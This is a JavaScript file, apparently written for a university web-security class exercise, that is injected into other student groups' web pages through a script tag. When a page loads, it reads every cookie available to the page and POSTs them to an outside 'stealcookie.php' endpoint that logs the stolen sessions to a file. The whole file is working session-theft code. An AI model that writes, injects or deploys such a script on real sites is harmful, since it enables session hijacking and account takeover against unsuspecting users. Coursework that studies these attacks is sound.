/**
 * JavaScript file that is called in Group 2's <script src="this file"></script>
 * as well as Group 1's page (stealing their PHP sessions).
 * Sends ALL of the cookies associated with this site to stealcookie.php, which in turn writes
 * the cookie data to the stolen_cookies.txt.
 *
 */
let currentURL = window.location.href

//determine which group's site we are
const group = currentURL.includes("Group2") ? "Group 2" : "Group 1";

//build the request options
let date = new Date();
const url = "http://weblab.salemstate.edu/~csc435Fall2020Group4/stealcookie.php";
console.log("Cookie value is ", document.cookie);
const requestOptions = {
    method: 'POST',
    mode: 'no-cors', // no-cors, *cors, same-origin
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify( {
        group: group,
        date: date.getMonth() + "/" + date.getDay() + "/" + date.getFullYear() + " " + date.getTime(),
        cookie: document.cookie
    }
    )
};

//send the request
fetch(url, requestOptions)
    .then(async response => {
        const data = await response.json();
        console.log("Data is ", data);

        // check for error response
        if (!response.ok) {
            console.log("Response was not OK ", response.status)
        }

    })
    .catch(error => {
        console.log("Error was ", error)
        console.error('There was an error!', error);

    });

